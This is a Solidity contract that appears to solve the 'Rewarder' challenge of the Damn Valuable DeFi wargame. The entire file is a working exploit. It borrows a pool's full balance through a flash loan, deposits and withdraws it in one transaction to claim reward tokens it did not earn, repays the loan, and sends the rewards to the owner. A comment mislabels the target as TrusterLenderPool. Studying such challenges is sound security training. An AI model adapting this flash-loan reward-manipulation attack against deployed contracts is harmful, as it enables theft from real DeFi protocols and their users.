// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

// Our contract to spoof TrusterLenderPool
contract RewarderHack {
  FlashLoanerPool public flashLoanPool;
  TheRewarderPool public rewardPool;
  DamnValuableToken public token;
  address public owner;

  constructor(address payable _flashPool, address payable _rewardPool, address payable _token) {
    flashLoanPool = FlashLoanerPool(_flashPool);
    rewardPool = TheRewarderPool(_rewardPool);
    token = DamnValuableToken(_token);
    owner = msg.sender;
  }

  function attackTarget(uint256 _targetAmount) external {
    require(msg.sender == owner, 'Owner Only');

    // Get flashloan for full balance of pool to maximize exploit
    flashLoanPool.flashLoan(_targetAmount);

    // need to send our reward back to owner to pass test
    ERC20(address(rewardPool.rewardToken())).transfer(owner, ERC20(address(rewardPool.rewardToken())).balanceOf(address(this)));
  }

  function receiveFlashLoan(uint256 _amount) external {
    // On flash loan, approve, deposit, and withdraw to get pool rewards since
    // only once depositing for past 5 days
    token.approve(payable(address(rewardPool)), _amount);
    rewardPool.deposit(_amount);
    rewardPool.withdraw(_amount);
    // Payback flash loan
    token.transfer(payable(address(flashLoanPool)), _amount);
  }


  receive() external payable {}

}
